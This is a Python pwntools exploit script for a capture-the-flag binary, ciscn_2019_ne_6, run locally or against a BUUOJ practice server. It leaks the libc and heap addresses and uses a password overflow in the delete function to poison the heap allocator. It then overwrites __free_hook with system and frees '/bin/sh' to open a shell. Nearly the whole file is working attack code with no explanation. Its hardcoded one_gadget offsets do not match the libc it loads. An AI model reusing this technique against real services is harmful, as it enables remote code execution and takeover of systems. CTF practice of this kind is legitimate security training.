#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./ciscn_2019_ne_6'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/usr/lib/freelibs/amd64/2.27-3ubuntu1_amd64/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',25871)
			elf=ELF(elfelf)
			libc=ELF('/usr/lib/freelibs/amd64/2.27-3ubuntu1_amd64/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		def add(a,b):
			io.sendlineafter('>> ','2')
			io.sendlineafter('passwd:','a')
			io.sendlineafter('size:',str(a))
			io.sendafter('Content:',b)

		def edit(a,b):
			io.sendlineafter('>> ','3')
			io.sendlineafter('passwd:','a')
			io.sendlineafter('index:',str(a))
			io.sendafter('Content:',b)

		def show():
			io.sendlineafter('>> ','1')

		def delete(a,b='a\n'):
			io.sendlineafter('>> ','4')
			io.sendafter('passwd:',b)
			io.sendlineafter('index:',str(a))

		add(0x500,'aaaaaaaaa\n')
		add(0x60,'aaaaaa\n')
		add(0x60,'aaaaaa\n')
		delete(0)
		add(0x500,'a'*8+'\n')
		show()
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']

		delete(1)
		delete(2)
		add(0x60,'\n')
		add(0x60,'\n')
		show()
		io.recvuntil('1: ')
		heap_base=u64(io.recv(6)+"\x00\x00")
		# gdb.attach(io,'b *$rebase(0x12b8)')
		delete(2)
		delete(15,'a'*0x20+p64(heap_base))
		add(0x60,p64(libc.sym['__free_hook'])+'\n')
		add(0x60,'/bin/sh\x00\n')
		add(0x60,p64(system_addr)+'\n')
		delete(3)

		
		success('libc_base:'+hex(libc_base))
		success('heap_base:'+hex(heap_base))
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue